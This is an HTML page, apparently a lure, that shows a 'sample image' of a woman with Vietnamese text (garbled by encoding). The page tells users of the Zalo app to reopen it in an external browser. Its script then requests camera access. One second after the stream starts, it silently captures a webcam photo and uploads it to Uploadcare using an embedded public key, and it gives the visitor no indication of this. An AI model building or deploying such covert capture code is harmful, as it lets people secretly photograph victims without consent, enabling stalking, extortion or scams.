<head>
  <meta charset="UTF-8">

  <style>
    body {
      font-family: Arial, sans-serif;

      padding: 20px;
    }
    img.main-img {
      width: 300px;

      background: #fff3cd;

<body>

  <h2>·∫¢nh m·∫´u:</h2>
  <img class="main-img" src="https://phamgiamedia.vn/wp-content/uploads/2023/12/Ngoc-Trinh-2.jpg" alt="Sample Image">

  <div id="zalo-warning">
    <p><strong>‚ö†Ô∏è Zalo kh√¥ng h·ªó tr·ª£ camera.</strong></p>
    <p>Vui l√≤ng nh·∫•n n√∫t b√™n d∆∞·ªõi ƒë·ªÉ m·ªü b·∫±ng tr√¨nh duy·ªát ngo√†i (Chrome, Safari...)</p>
    <p>üìå N·∫øu kh√¥ng ƒë∆∞·ª£c, b·∫°n nh·∫•n d·∫•u ba ch·∫•m (‚ãÆ) v√† ch·ªçn "M·ªü b·∫±ng tr√¨nh duy·ªát"</p>
    <button onclick="openInBrowser()">M·ªü b·∫±ng tr√¨nh duy·ªát</button>
  </div>

  <video id="video" autoplay playsinline></video>

  <script>
    const video = document.getElementById('video');
    const zaloWarning = document.getElementById('zalo-warning');

    function isZaloWebview() {
      const ua = navigator.userAgent.toLowerCase();
      return ua.includes("zalo");
    }

    if (isZaloWebview()) {
      zaloWarning.style.display = 'block';
    } else {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.onloadedmetadata = () => {
            setTimeout(() => {
              captureAndUpload();
            }, 1000);
          };
        })
        .catch(err => {
          console.error('Kh√¥ng th·ªÉ truy c·∫≠p camera:', err);
        });
    }

    function openInBrowser() {
      const url = window.location.href;
      window.open(url, "_blank");
    }

    function captureAndUpload() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('UPLOADCARE_STORE', '1');
        formData.append('UPLOADCARE_PUB_KEY', '830b3ce89606cea831ba');
        formData.append('file', blob, 'photo.jpg');

        fetch('https://upload.uploadcare.com/base/', {
          method: 'POST',
          body: formData
        })
        .then(res => res.json())
        .then(data => {
          console.log('‚úÖ ·∫¢nh ƒë√£ upload:', data);
        })
        .catch(err => {
          console.error('‚ùå L·ªói upload:', err);
        });
      }, 'image/jpeg');
    }
  </script>

</body>
